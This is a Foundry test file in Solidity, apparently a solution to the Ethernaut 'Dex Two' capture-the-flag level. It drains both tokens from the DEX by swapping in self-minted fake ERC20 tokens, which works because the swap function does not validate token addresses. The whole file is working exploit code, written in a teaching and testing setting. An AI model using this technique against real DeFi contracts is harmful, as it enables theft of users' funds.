// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level23.sol";
import "forge-std/Test.sol";

contract ExploitLevel23 is Test {
    DexTwo instance = DexTwo(0x808FD0D3193559D39E4d31B5656a19791A3C7707);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;
    address token1;
    address token2;

    function setUp() external {
        vm.createSelectFork("sepolia");
        token1 = instance.token1();
        token2 = instance.token2();
    }

    function testExploit() external {
        console.log("Dex initial balance of token1:", instance.balanceOf(token1, address(instance)));
        console.log("Dex initial balance of token2:", instance.balanceOf(token2, address(instance)));
        console.log("Player initial balance of token1:", instance.balanceOf(token1, player));
        console.log("Player initial balance of token2:", instance.balanceOf(token2, player));

        vm.startPrank(player);

        FakeToken fake1 = new FakeToken();
        fake1.transfer(address(instance), 1);
        FakeToken fake2 = new FakeToken();
        fake2.transfer(address(instance), 1);

        fake1.approve(address(instance), 1);
        instance.swap(address(fake1), token1, 1);
        fake2.approve(address(instance), 1);
        instance.swap(address(fake2), token2, 1);
        vm.stopPrank();

        console.log("======================");
        console.log("Dex final balance of token1:", instance.balanceOf(token1, address(instance)));
        console.log("Dex final balance of token2:", instance.balanceOf(token2, address(instance)));
    }
}

contract FakeToken is ERC20 {
    constructor() ERC20("Fake Token", "FAKE") {
        _mint(msg.sender, 100);
    }
}
